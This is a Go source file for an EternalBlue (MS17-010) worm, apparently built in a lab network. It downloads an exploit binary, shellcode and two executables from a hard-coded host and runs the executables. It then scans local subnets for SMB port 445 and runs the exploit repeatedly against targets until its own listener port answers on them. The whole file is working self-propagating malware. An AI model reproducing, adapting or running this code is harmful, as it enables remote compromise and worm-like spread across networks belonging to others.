//https://www.helplib.com/GitHub/article_155107
//https://github.com/phink-team/Cobaltstrike-MS17-010/blob/master/modules/pwndog.cna
//https://github.com/haysengithub/Eternal-Blue
package main
import (
	"fmt"
	"net"
	"time"
	"strings"
	"strconv"
	"net/http"
	"log"
	"os"
	"os/exec"
	"io"
	//"bytes"
)

type ip_target struct{
	net_card string
	be_scan bool
	alive bool
	is_getin bool
	port []int
}

//????????
func PathExists(path string) (bool, error) {
	_, err := os.Stat(path)
	if err == nil {
		return true, nil
	}
	if os.IsNotExist(err) {
		return false, nil
	}
	return false, err
}

func Downloadfile(url string, file_name string) {
    res, err := http.Get(url)
    if err != nil {
        log.Fatal("get url ", err)
    }
    f, err := os.Create(file_name)
    if err != nil {
        log.Fatal("create file ", err)
    }
	io.Copy(f, res.Body)
	f.Close()
}

func hosts(ipnet net.IPNet) ([]net.IP, error) {
	var ips []net.IP
	ip := ipnet.IP
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
		ips = append(ips, ip)
	}
	return ips[1 : len(ips)-1], nil
}
	
func inc(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}


func Ips() (map[string]*ip_target,error){
	var ip_map=make(map[string]*ip_target)
    interfaces, err := net.Interfaces()
    if err != nil {
        return nil,err
    }
    for _, i := range interfaces {	
		if (i.Flags & net.FlagUp) == 0{
			continue
		}
        byName, err := net.InterfaceByName(i.Name)
        if err != nil {
            return nil,err
        }
        addresses, err := byName.Addrs()
        for _, v := range addresses {
			if ipnet, ok := v.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
				if ipnet.IP.To4() != nil {
					if  strings.Index(byName.Name, "蓝牙")==-1 && strings.Index(byName.Name, "Npcap Loopback Adapter")==-1{
						ip := ipnet.IP
						for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
							ip_t:=new(ip_target)
							ip_t.net_card = byName.Name
							ip_map[ip.String()]=ip_t
						}
					}
				}
			}
        }
    }
    return ip_map,nil
}



func index(w http.ResponseWriter, r *http.Request) {
    fmt.Fprintf(w, "Hello golang http!")
}

func open_lis_port(port int){
	fmt.Println("Open the http port ")

	
    http.HandleFunc("/", index)
 

    err := http.ListenAndServe(":"+strconv.Itoa(port), nil)
    if err != nil {
        log.Fatal("ListenAndServe: ", err)
    }
}


func main(){
	//ip_list := list.New()
	reverse_flag :=false
	port_list := []int{139,445,8875}
	file_list := []string{"e.exe","sc_all.bin","86.exe","64.exe"}
	fmt.Println("hello1 233")

	_, err  := net.DialTimeout("tcp", "127.0.0.1:8875", time.Second*3)
	if err == nil{
		log.Fatal("pwn ", err)
	}

	go open_lis_port(8875)

	for{
		for _,k :=range(file_list){
			is_exist,_ :=  PathExists(k)
			if is_exist == false{
				Downloadfile("http://192.168.56.109/"+k, k)
			}
		}

		if reverse_flag == false{
			exec.Command("86.exe").Start()
			exec.Command("64.exe").Start()
			reverse_flag = true

		}

		ip_map,_:=Ips()
		for i,_ := range(ip_map){
			if i != "192.168.56.110" && i != "192.168.56.106"{
				delete(ip_map,i)
				continue
			}
			fmt.Println(i)
			need_pwn := 0	
			for _,port :=range(port_list){
				_, err  := net.DialTimeout("tcp", i+":"+strconv.Itoa(port), time.Second*3)
				if err != nil{
					continue
				}
				ip_map[i].port = append(ip_map[i].port,port)
				if port ==445{
					need_pwn |= 1
				}
				if port == 8875{
					need_pwn |= 2
				}
				fmt.Println(port)
			}
			
			
			if need_pwn ==1{
				for numGroomConn:=1;numGroomConn<=17;numGroomConn++{
					ff,ee:=exec.Command("e.exe",i,"sc_all.bin",strconv.Itoa(numGroomConn)).Output()
					//exec.Command("cmd","/C","e.exe "+i+" sc_all.bin "+strconv.Itoa(numGroomConn)).Start()
					//exec.Command("cmd","/c","start","e.exe "+i+" sc_all.bin "+strconv.Itoa(numGroomConn)).Start()
					fmt.Println(string(ff),ee)

					
					_, err  := net.DialTimeout("tcp", i+":8875", time.Second*1)
					if err == nil{
						fmt.Println("pwn "+i+" ok")
						break
					}else {
						fmt.Println("try"+i)
					}
					time.Sleep(7*time.Second)
				}
			}
		}
	//time.Sleep(5*time.Second)
	}
	
}